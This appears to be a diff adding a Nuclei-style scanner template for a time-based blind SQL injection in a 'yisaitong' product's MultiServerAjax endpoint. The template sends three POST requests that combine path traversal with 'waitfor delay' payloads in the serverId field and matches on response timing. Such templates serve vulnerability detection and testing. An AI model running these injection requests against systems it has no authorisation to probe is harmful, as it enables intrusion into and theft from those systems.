@@ -1,0 +1,40 @@
+id: yisaitong-MultiServerAjax-sqli
+
+info:
+  name: yisaitong-MultiServerAjax-sqli
+  author: yisaitong-MultiServerAjax-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId=-1'waitfor delay '0:0:0'--
+
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId=-1'waitfor delay '0:0:2'--
+
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId=-1'waitfor delay '0:0:4'--
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration_1>=0  && duration_1<=2
+          - duration_2>=2  && duration_2<=4
+          - duration_3>=4  && duration_3<=6
